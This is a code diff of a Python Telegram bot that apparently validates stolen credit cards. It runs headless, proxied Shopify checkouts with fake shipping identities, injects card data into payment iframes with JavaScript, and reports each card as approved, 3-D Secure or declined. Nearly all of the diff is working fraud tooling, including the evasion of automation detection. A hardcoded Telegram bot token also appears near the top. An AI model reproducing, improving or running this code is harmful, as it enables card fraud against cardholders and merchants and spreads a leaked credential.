@@ -7,8 +7,6 @@ from telegram.ext import Updater, CommandHandler, ConversationHandler
 from playwright.sync_api import sync_playwright, TimeoutError
 from faker import Faker
 import requests
-import asyncio
-from concurrent.futures import ThreadPoolExecutor
 
 TELEGRAM_TOKEN = '7495663085:AAH8Mr2aZK7DrS8DFHTxhKqN9uJU1DSNtd0'
 USER_DATA_FILE = "user_data.json"
@@ -102,9 +100,8 @@ def check(update, context):
     try:
         cc, mm, yyyy, cvc = context.args[0].strip().split("|")
         start_t = time.time()
-        # Generate fresh fake data for each check
         fresh_fake_data = generate_fresh_fake_data()
-        status, response, total = run_ultra_fast_checkout(
+        status, response, total = run_shopify_payment_checkout(
             udata['site'], udata['cheapest_product'], fresh_fake_data, cc, mm, yyyy, cvc
         )
         end_t = time.time()
@@ -132,40 +129,32 @@ def reset(update, context):
     return WAIT_SITE
 
 def find_cheapest_product_fast(shop_url):
-    """Ultra-fast product finder with minimal timeout"""
+    """Ultra-fast product finder"""
     try:
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'application/json',
             'Accept-Language': 'en-US,en;q=0.9',
-            'Connection': 'keep-alive',
-            'Cache-Control': 'no-cache'
+            'Connection': 'keep-alive'
         }
         
-        endpoint = f"{shop_url}/products.json?limit=30"
-        print(f"Fetching products from: {endpoint}")
-        
-        r = requests.get(endpoint, timeout=10, headers=headers, allow_redirects=True)
+        endpoint = f"{shop_url}/products.json?limit=25"
+        r = requests.get(endpoint, timeout=8, headers=headers)
         
         if r.status_code != 200:
             return f"Failed to fetch products (Status: {r.status_code})", None
         
-        try:
-            data = r.json()
-        except json.JSONDecodeError:
-            return "Invalid JSON response from products endpoint", None
-        
+        data = r.json()
         products = data.get("products", [])
         if not products:
             return "No products found", None
         
-        # Find cheapest available product quickly
         cheapest = None
-        for prod in products[:15]:  # Check only first 15 products
+        for prod in products[:12]:
             if not prod.get("variants"):
                 continue
                 
-            for variant in prod.get("variants", [])[:2]:  # Check max 2 variants per product
+            for variant in prod.get("variants", [])[:2]:
                 if not variant.get("available", True):
                     continue
                     
@@ -185,16 +174,13 @@ def find_cheapest_product_fast(shop_url):
         if not cheapest:
             return "No available products found", None
         
-        print(f"Found product: {cheapest['title']} - ${cheapest['price']}")
         return "OK", cheapest
         
-    except requests.exceptions.RequestException as e:
-        return f"Network error: {str(e)[:50]}", None
     except Exception as e:
         return f"Error: {str(e)[:50]}", None
 
-def run_ultra_fast_checkout(site, product, shipping, cc, mm, yyyy, cvc):
-    """Ultra-fast checkout with aggressive optimizations"""
+def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
+    """Enhanced Shopify checkout with specialized payment iframe handling"""
     proxies = load_proxies()
     proxy_str = get_random_proxy(proxies)
     proxy_arg = {}
@@ -218,7 +204,6 @@ def run_ultra_fast_checkout(site, product, shipping, cc, mm, yyyy, cvc):
     
     try:
         with sync_playwright() as p:
-            # Ultra-fast browser launch
             browser = p.chromium.launch(
                 headless=True,
                 args=[
@@ -230,11 +215,8 @@ def run_ultra_fast_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                     '--disable-features=VizDisplayCompositor',
                     '--disable-blink-features=AutomationControlled',
                     '--disable-background-timer-throttling',
-                    '--disable-backgrounding-occluded-windows',
-                    '--disable-renderer-backgrounding',
                     '--disable-extensions',
-                    '--disable-plugins',
-                    '--disable-images'
+                    '--disable-plugins'
                 ]
             )
             
@@ -250,186 +232,119 @@ def run_ultra_fast_checkout(site, product, shipping, cc, mm, yyyy, cvc):
             context = browser.new_context(**context_options)
             page = context.new_page()
             
-            # Set ultra-fast timeouts
-            page.set_default_timeout(15000)  # 15 seconds max
-            page.set_default_navigation_timeout(20000)  # 20 seconds for navigation
+            page.set_default_timeout(12000)
+            page.set_default_navigation_timeout(15000)
             
             try:
-                # Step 1: Add to cart (ultra-fast)
+                # Add to cart
                 print("Adding to cart...")
                 page.goto(f"{site}/cart/add?id={product['variant_id']}&quantity=1", 
-                         timeout=15000, wait_until='domcontentloaded')
-                time.sleep(0.3)
-                
-                # Step 2: Go to checkout
-                print("Going to checkout...")
-                page.goto(f"{site}/checkout", timeout=15000, wait_until='domcontentloaded')
+                         timeout=12000, wait_until='domcontentloaded')
                 time.sleep(0.5)
                 
-                # Step 3: Enhanced email field detection and filling
-                print("Finding and filling email...")
+                # Go to checkout
+                print("Going to checkout...")
+                page.goto(f"{site}/checkout", timeout=12000, wait_until='domcontentloaded')
+                time.sleep(0.8)
+                
+                # Fill email with multiple strategies
+                print("Filling email...")
+                email_filled = False
+                
+                # Strategy 1: Standard selectors
                 email_selectors = [
                     'input[name="checkout[email]"]',
                     'input[type="email"]',
                     '#checkout_email',
                     'input[placeholder*="email" i]',
                     'input[autocomplete="email"]',
-                    'input[data-testid="email"]',
-                    'input[id*="email"]',
-                    'input[class*="email"]',
-                    '.checkout__email input',
-                    '[data-step="contact_information"] input[type="email"]',
                     'input[name="email"]'
                 ]
                 
-                email_filled = False
                 for selector in email_selectors:
                     try:
                         if page.query_selector(selector):
                             page.fill(selector, shipping['email'], timeout=3000)
                             email_filled = True
-                            print(f"Email filled with selector: {selector}")
                             break
                     except:
                         continue
                 
-                # If standard selectors fail, try JavaScript approach
+                # Strategy 2: JavaScript injection
                 if not email_filled:
                     try:
                         page.evaluate(f"""
                             const emailInputs = document.querySelectorAll('input');
                             for (let input of emailInputs) {{
                                 if (input.type === 'email' || 
-                                    input.name.includes('email') || 
-                                    input.placeholder.toLowerCase().includes('email') ||
-                                    input.id.includes('email')) {{
+                                    input.name.toLowerCase().includes('email') || 
+                                    input.placeholder && input.placeholder.toLowerCase().includes('email')) {{
+                                    input.focus();
                                     input.value = '{shipping['email']}';
                                     input.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                     input.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                    input.blur();
                                     break;
                                 }}
                             }}
                         """)
                         email_filled = True
-                        print("Email filled using JavaScript")
                     except:
                         pass
                 
                 if not email_filled:
                     browser.close()
-                    return "DECLINED", "Email field not found - trying alternative approach", product["price"]
+                    return "DECLINED", "Email field detection failed", product["price"]
                 
-                # Step 4: Fill shipping info rapidly with enhanced detection
+                # Fill shipping information
                 print("Filling shipping info...")
                 name_parts = shipping['name'].split()
                 first_name = name_parts[0] if name_parts else "John"
                 last_name = name_parts[-1] if len(name_parts) > 1 else "Doe"
                 
-                # Enhanced shipping field mapping
-                shipping_fields = [
-                    (['input[name="checkout[shipping_address][first_name]"]', 'input[name="first_name"]', '#checkout_shipping_address_first_name', 'input[placeholder*="first" i]'], first_name),
-                    (['input[name="checkout[shipping_address][last_name]"]', 'input[name="last_name"]', '#checkout_shipping_address_last_name', 'input[placeholder*="last" i]'], last_name),
-                    (['input[name="checkout[shipping_address][address1]"]', 'input[name="address1"]', '#checkout_shipping_address_address1', 'input[placeholder*="address" i]'], shipping['address']),
-                    (['input[name="checkout[shipping_address][city]"]', 'input[name="city"]', '#checkout_shipping_address_city', 'input[placeholder*="city" i]'], shipping['city']),
-                    (['input[name="checkout[shipping_address][zip]"]', 'input[name="zip"]', '#checkout_shipping_address_zip', 'input[placeholder*="zip" i]'], shipping['zip']),
-                    (['input[name="checkout[shipping_address][phone]"]', 'input[name="phone"]', '#checkout_shipping_address_phone', 'input[placeholder*="phone" i]'], shipping['phone'])
+                shipping_data = [
+                    (['input[name="checkout[shipping_address][first_name]"]', '#checkout_shipping_address_first_name'], first_name),
+                    (['input[name="checkout[shipping_address][last_name]"]', '#checkout_shipping_address_last_name'], last_name),
+                    (['input[name="checkout[shipping_address][address1]"]', '#checkout_shipping_address_address1'], shipping['address']),
+                    (['input[name="checkout[shipping_address][city]"]', '#checkout_shipping_address_city'], shipping['city']),
+                    (['input[name="checkout[shipping_address][zip]"]', '#checkout_shipping_address_zip'], shipping['zip']),
+                    (['input[name="checkout[shipping_address][phone]"]', '#checkout_shipping_address_phone'], shipping['phone'])
                 ]
                 
-                for selectors, value in shipping_fields:
-                    filled = False
+                for selectors, value in shipping_data:
                     for selector in selectors:
                         try:
                             if page.query_selector(selector):
                                 page.fill(selector, value, timeout=2000)
-                                filled = True
                                 break
-                        except:
-                            continue
-                    
-                    # If normal filling fails, try JavaScript
-                    if not filled:
-                        try:
-                            field_type = selectors[0].split('[')[-1].split(']')[0].split('_')[-1]
-                            page.evaluate(f"""
-                                const inputs = document.querySelectorAll('input');
-                                for (let input of inputs) {{
-                                    if (input.name.includes('{field_type}') || 
-                                        input.placeholder.toLowerCase().includes('{field_type}') ||
-                                        input.id.includes('{field_type}')) {{
-                                        input.value = '{value}';
-                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
-                                        break;
-                                    }}
-                                }}
-                            """)
                         except:
                             continue
                 
-                # Step 5: Handle country quickly
+                # Handle country
                 try:
-                    country_selectors = [
-                        'select[name="checkout[shipping_address][country]"]',
-                        'select[name="country"]',
-                        '#checkout_shipping_address_country'
-                    ]
-                    for selector in country_selectors:
-                        try:
-                            if page.query_selector(selector):
-                                page.select_option(selector, 'United States', timeout=2000)
-                                break
-                        except:
-                            continue
+                    page.select_option('select[name="checkout[shipping_address][country]"]', 'United States', timeout=2000)
                 except:
                     pass
                 
-                # Step 6: Continue to shipping (enhanced button detection)
+                # Continue to shipping
                 print("Continuing to shipping...")
                 continue_buttons = [
                     'button[type="submit"]',
                     'button:has-text("Continue")',
-                    'input[type="submit"]',
-                    '.btn-continue',
-                    '#continue_button',
-                    'button[data-testid="continue"]',
-                    '.checkout__continue button'
+                    '.btn-continue'
                 ]
                 
-                continue_clicked = False
                 for btn_selector in continue_buttons:
                     try:
                         if page.query_selector(btn_selector):
                             page.click(btn_selector, timeout=3000)
-                            continue_clicked = True
                             break
                     except:
                         continue
                 
-                # JavaScript fallback for continue button
-                if not continue_clicked:
-                    try:
-                        page.evaluate("""
-                            const buttons = document.querySelectorAll('button, input[type="submit"]');
-                            for (let btn of buttons) {
-                                if (btn.textContent.toLowerCase().includes('continue') || 
-                                    btn.type === 'submit' ||
-                                    btn.textContent.toLowerCase().includes('next')) {
-                                    btn.click();
-                                    break;
-                                }
-                            }
-                        """)
-                        continue_clicked = True
-                    except:
-                        pass
+                time.sleep(1.2)
                 
-                if not continue_clicked:
-                    browser.close()
-                    return "DECLINED", "Continue button not found", product["price"]
-                
-                # Wait for shipping page
-                time.sleep(1)
-                
-                # Step 7: Continue to payment (second continue)
+                # Continue to payment
                 print("Continuing to payment...")
                 for btn_selector in continue_buttons:
                     try:
@@ -439,137 +354,187 @@ def run_ultra_fast_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                     except:
                         continue
                 
-                time.sleep(1)
+                time.sleep(1.5)
                 
-                # Step 8: Get total price quickly
+                # Get total price
                 total_price = product["price"]
-                price_selectors = [
-                    '.payment-due__price',
-                    '.total-line__price',
-                    '[data-testid="total-price"]',
-                    '.checkout__total',
-                    'span[data-checkout-payment-due-target="total"]'
-                ]
+                try:
+                    total_text = page.inner_text('.payment-due__price', timeout=2000)
+                    total_price = float(total_text.replace("$", "").replace(",", "").strip())
+                except:
+                    pass
                 
-                for price_selector in price_selectors:
-                    try:
-                        total_text = page.inner_text(price_selector, timeout=2000)
-                        total_price = float(total_text.replace("$", "").replace(",", "").strip())
-                        break
-                    except:
-                        continue
+                # Enhanced payment iframe handling
+                print("Handling payment iframe...")
                 
-                # Step 9: Enhanced payment iframe detection and filling
-                print("Finding payment iframe...")
+                # Wait for iframe to load
+                iframe_loaded = False
                 iframe_selectors = [
                     'iframe[src*="card-fields"]',
                     'iframe[name*="card"]',
-                    'iframe[id*="card"]',
-                    'iframe[src*="checkout"]',
-                    'iframe'
+                    'iframe[src*="checkout"]'
                 ]
                 
-                iframe_found = False
                 for iframe_selector in iframe_selectors:
                     try:
-                        page.wait_for_selector(iframe_selector, timeout=10000)
-                        iframe_found = True
+                        page.wait_for_selector(iframe_selector, timeout=8000)
+                        iframe_loaded = True
                         break
                     except:
                         continue
                 
-                if not iframe_found:
+                if not iframe_loaded:
                     browser.close()
-                    return "DECLINED", "Payment iframe not found", total_price
+                    return "DECLINED", "Payment iframe not loaded", total_price
                 
-                # Fill card details with enhanced logic
-                print("Filling card details...")
-                card_data = {
-                    "number": cc,
-                    "expiry": f"{mm}/{yyyy[-2:]}",
-                    "verification_value": cvc
-                }
+                # Advanced card field filling with multiple strategies
+                print("Filling card fields...")
+                card_filled = 0
                 
-                filled_count = 0
+                # Strategy 1: Direct iframe field access
                 for frame in page.frames:
-                    if not frame.url or "card" not in frame.url.lower():
+                    frame_url = frame.url.lower()
+                    if not frame_url or ("card" not in frame_url and "checkout" not in frame_url):
                         continue
                     
                     try:
-                        # Enhanced field selectors for each card field
-                        field_mappings = {
-                            'number': [
-                                'input[name="number"]',
-                                'input[placeholder*="card" i]',
-                                'input[autocomplete="cc-number"]',
-                                'input[data-testid="card-number"]',
-                                '#card-number'
-                            ],
-                            'expiry': [
-                                'input[name="expiry"]',
-                                'input[placeholder*="expiry" i]',
-                                'input[placeholder*="mm/yy" i]',
-                                'input[autocomplete="cc-exp"]',
-                                'input[data-testid="expiry"]',
-                                '#card-expiry'
-                            ],
-                            'verification_value': [
-                                'input[name="verification_value"]',
-                                'input[placeholder*="cvv" i]',
-                                'input[placeholder*="cvc" i]',
-                                'input[autocomplete="cc-csc"]',
-                                'input[data-testid="cvv"]',
-                                '#card-cvc'
-                            ]
-                        }
+                        # Card number
+                        number_selectors = [
+                            'input[name="number"]',
+                            'input[placeholder*="card" i]',
+                            'input[autocomplete="cc-number"]',
+                            'input[data-testid="card-number"]',
+                            '#card-number',
+                            'input[aria-label*="card" i]'
+                        ]
                         
-                        for field_name, value in card_data.items():
-                            field_filled = False
-                            for selector in field_mappings[field_name]:
-                                try:
-                                    if frame.query_selector(selector):
-                                        frame.fill(selector, value, timeout=2000)
-                                        filled_count += 1
-                                        field_filled = True
-                                        break
-                                except:
-                                    continue
+                        for selector in number_selectors:
+                            try:
+                                if frame.query_selector(selector):
+                                    frame.fill(selector, cc, timeout=3000)
+                                    card_filled += 1
+                                    print(f"Card number filled with: {selector}")
+                                    break
+                            except:
+                                continue
+                        
+                        # Expiry date
+                        expiry_selectors = [
+                            'input[name="expiry"]',
+                            'input[placeholder*="mm/yy" i]',
+                            'input[placeholder*="expiry" i]',
+                            'input[autocomplete="cc-exp"]',
+                            'input[data-testid="expiry"]',
+                            '#card-expiry'
+                        ]
+                        
+                        expiry_value = f"{mm}/{yyyy[-2:]}"
+                        for selector in expiry_selectors:
+                            try:
+                                if frame.query_selector(selector):
+                                    frame.fill(selector, expiry_value, timeout=3000)
+                                    card_filled += 1
+                                    print(f"Expiry filled with: {selector}")
+                                    break
+                            except:
+                                continue
+                        
+                        # CVV
+                        cvv_selectors = [
+                            'input[name="verification_value"]',
+                            'input[placeholder*="cvv" i]',
+                            'input[placeholder*="cvc" i]',
+                            'input[autocomplete="cc-csc"]',
+                            'input[data-testid="cvv"]',
+                            '#card-cvc'
+                        ]
+                        
+                        for selector in cvv_selectors:
+                            try:
+                                if frame.query_selector(selector):
+                                    frame.fill(selector, cvc, timeout=3000)
+                                    card_filled += 1
+                                    print(f"CVV filled with: {selector}")
+                                    break
+                            except:
+                                continue
+                        
+                        if card_filled >= 3:
+                            break
                             
-                            # JavaScript fallback for card fields
-                            if not field_filled:
-                                try:
-                                    frame.evaluate(f"""
-                                        const inputs = document.querySelectorAll('input');
-                                        for (let input of inputs) {{
-                                            if (input.name === '{field_name}' || 
-                                                input.placeholder.toLowerCase().includes('{field_name.replace('verification_value', 'cvv')}')) {{
-                                                input.value = '{value}';
-                                                input.dispatchEvent(new Event('input', {{ bubbles: true }}));
-                                                input.dispatchEvent(new Event('change', {{ bubbles: true }}));
-                                                break;
-                                            }}
-                                        }}
-                                    """)
-                                    filled_count += 1
-                                except:
-                                    continue
-                    except:
+                    except Exception as e:
+                        print(f"Frame error: {e}")
                         continue
                 
-                if filled_count < 3:
-                    browser.close()
-                    return "DECLINED", f"Card fields incomplete ({filled_count}/3)", total_price
+                # Strategy 2: JavaScript injection in iframe
+                if card_filled < 3:
+                    print("Trying JavaScript injection for card fields...")
+                    for frame in page.frames:
+                        frame_url = frame.url.lower()
+                        if not frame_url or ("card" not in frame_url and "checkout" not in frame_url):
+                            continue
+                        
+                        try:
+                            # Inject card data via JavaScript
+                            frame.evaluate(f"""
+                                const inputs = document.querySelectorAll('input');
+                                let filled = 0;
+                                
+                                for (let input of inputs) {{
+                                    // Card number
+                                    if ((input.name && input.name.includes('number')) || 
+                                        (input.placeholder && input.placeholder.toLowerCase().includes('card'))) {{
+                                        input.focus();
+                                        input.value = '{cc}';
+                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                        input.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                        input.blur();
+                                        filled++;
+                                    }}
+                                    // Expiry
+                                    else if ((input.name && input.name.includes('expiry')) || 
+                                             (input.placeholder && (input.placeholder.toLowerCase().includes('mm/yy') || 
+                                                                   input.placeholder.toLowerCase().includes('expiry')))) {{
+                                        input.focus();
+                                        input.value = '{mm}/{yyyy[-2:]}';
+                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                        input.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                        input.blur();
+                                        filled++;
+                                    }}
+                                    // CVV
+                                    else if ((input.name && (input.name.includes('verification') || input.name.includes('cvv'))) || 
+                                             (input.placeholder && (input.placeholder.toLowerCase().includes('cvv') || 
+                                                                   input.placeholder.toLowerCase().includes('cvc')))) {{
+                                        input.focus();
+                                        input.value = '{cvc}';
+                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                        input.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                        input.blur();
+                                        filled++;
+                                    }}
+                                }}
+                                
+                                return filled;
+                            """)
+                            card_filled = 3  # Assume success if no error
+                            break
+                        except Exception as e:
+                            print(f"JavaScript injection error: {e}")
+                            continue
                 
-                # Step 10: Submit payment with enhanced detection
+                if card_filled < 3:
+                    browser.close()
+                    return "DECLINED", f"Card fields incomplete ({card_filled}/3) - iframe access blocked", total_price
+                
+                # Submit payment
                 print("Submitting payment...")
                 payment_buttons = [
                     'button[type="submit"]',
                     'button:has-text("Complete")',
                     'button:has-text("Pay")',
                     'button:has-text("Place")',
-                    '.btn-checkout',
-                    '#submit_button',
-                    'button[data-testid="submit"]'
+                    '.btn-checkout'
                 ]
                 
                 payment_submitted = False
@@ -582,15 +547,14 @@ def run_ultra_fast_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                     except:
                         continue
                 
-                # JavaScript fallback for payment submission
                 if not payment_submitted:
+                    # JavaScript fallback
                     try:
                         page.evaluate("""
                             const buttons = document.querySelectorAll('button, input[type="submit"]');
                             for (let btn of buttons) {
                                 if (btn.textContent.toLowerCase().includes('complete') || 
                                     btn.textContent.toLowerCase().includes('pay') ||
-                                    btn.textContent.toLowerCase().includes('place') ||
                                     btn.type === 'submit') {
                                     btn.click();
                                     break;
@@ -603,22 +567,22 @@ def run_ultra_fast_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                 
                 if not payment_submitted:
                     browser.close()
-                    return "DECLINED", "Payment button not found", total_price
+                    return "DECLINED", "Payment submission failed", total_price
                 
-                # Step 11: Wait for result (reduced wait time)
+                # Wait for result
                 print("Waiting for result...")
-                time.sleep(3)  # Reduced from 4 seconds
+                time.sleep(4)
                 
                 url = page.url.lower()
                 content = page.content().lower()
                 browser.close()
                 
-                # Enhanced result detection
-                if any(keyword in url for keyword in ["thank_you", "success", "confirmation", "order-received"]):
+                # Result detection
+                if any(keyword in url for keyword in ["thank_you", "success", "confirmation"]):
                     return "APPROVED", "PAYMENT_SUCCESS", total_price
-                elif any(keyword in content for keyword in ["3d_secure", "3d-secure", "authentication", "verify", "otp"]):
+                elif any(keyword in content for keyword in ["3d_secure", "authentication", "verify"]):
                     return "3D", "3DS_REQUIRED", total_price
-                elif any(keyword in content for keyword in ["declined", "failed", "insufficient", "invalid"]):
+                elif any(keyword in content for keyword in ["declined", "failed", "insufficient"]):
                     return "DECLINED", "CARD_DECLINED", total_price
                 else:
                     return "DECLINED", "UNKNOWN_RESULT", total_price
@@ -634,7 +598,7 @@ def run_ultra_fast_checkout(site, product, shipping, cc, mm, yyyy, cvc):
         return "DECLINED", f"Browser error: {str(e)[:50]}", product["price"]
 
 def bin_lookup(bin_number):
-    """Fast BIN lookup with short timeout"""
+    """Fast BIN lookup"""
     try:
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
